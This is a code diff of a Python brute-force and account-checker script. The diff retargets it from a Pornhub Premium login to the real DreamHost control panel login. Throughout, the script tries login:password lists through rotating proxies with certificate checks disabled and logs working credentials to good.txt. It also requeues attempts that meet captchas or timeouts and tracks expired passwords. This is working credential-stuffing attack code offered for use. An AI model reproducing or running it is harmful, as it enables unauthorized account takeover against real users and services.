@@ -15,8 +15,8 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 class Brute(object):
     def __init__(self):
-        self.projectName = "PornHub"
-        self.projectFullName = "PornHub Bruteforce and Checker"
+        self.projectName = "DreamHost"
+        self.projectFullName = "DreamHost Bruteforce and Checker"
         self.description = "Author : Pirate2110"
         self.good = 0
         self.bad = 0 
@@ -38,33 +38,42 @@ class Brute(object):
     def check(self, login, password):
         try:
             
-            if self.proxytype != "burp":
-                proxies = {'https': self.proxytype +  "://" +self.getproxy(), 'http': self.proxytype +  "://" + self.getproxy()}
-            else:
+            if self.proxytype == "burp":
                 proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
-            headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36'}
-            s = requests.session()
-            r = s.get("https://rt.pornhubpremium.com/premium/login", proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
-            site = soup(r.text, "html.parser")
-            token = site.find("input", id="token")
-            body = {'username' : login, 'password': password, 'remember_me' : 'on', 'from':'mobile_login', 'token' : str(token['value']), 'redirect' : '', 'from' : 'pc_premium_login', 'segment':'straight'}
-            r = s.post("https://rt.pornhubpremium.com/front/authenticate", data=body, proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
+            elif self.proxytype == "no":
+                proxies = None
+            else:
+                proxies = {'https': self.proxytype +  "://" +self.getproxy(), 'http': self.proxytype +  "://" + self.getproxy()}
+            
+            
+            headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36', 'Cookie': 'sh=zUkXIjtaD3D0J_uVCuw8ipiDIGIKo6QzHpXZ2Z5TihpY81fbgZSalO7ELbD8;'}
+            body = {'username' : login, 'password': password, 'Nscmd' : 'Nlogin'}
+            
+            s = requests.Session()
+            r = s.post("https://panel.dreamhost.com/index.cgi", data=body, proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
             
 
-            if "\u041d\u0435\u0432\u0435\u0440\u043d\u043e\u0435" in r.json()['message']:
+            if "Email or password is incorrect." in r.text:
                 self.bad += 1
-            elif r.json()['success'] == "1":
-                if "https://rt.pornhubpremium.com/premium_signup?type=PhP-Lander" in r.json()['redirect']:
-                    self.writelog("good.txt", login + ":" + password)
-                else:
-                    self.writelog("premium.txt", login + ":" + password + "|" + str(r.text))
-                self.good += 1
-                #return login + ":" + password + "|" + str(r.json()['result']['basic']) + "|" + str(r.json()['result']['bonus'])
-            
+            elif "<div class=\"g-recaptcha\" data-sitekey=" in r.text:
+                self.captcha += 1
+                self.lines.append(login+':'+password)
+            elif "Your password has expired!" in r.text:
+                self.bad += 1
+                self.writelog("expired.txt", login + ":" + password)
+            elif "408 Request Time-out" in r.text:
+                self.error += 1
+                self.lines.append(login+':'+password)
+            elif "Dashboard</title>" in r.text:
+                self.projerror += 1
+                self.writelog("good.txt", login + ":" + password )
             else:
                 self.projerror += 1
+                self.writelog("projerr.txt", login + ":" + password + "|" + str(r.status_code) + "|" + r.text)
         except Exception as e:
-            #print("Error is " + str(e))
+            exc_type, exc_obj, exc_tb = sys.exc_info()
+            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+            #print(exc_type, fname, exc_tb.tb_lineno)
             self.error += 1
             self.lines.append(login+':'+password)
      
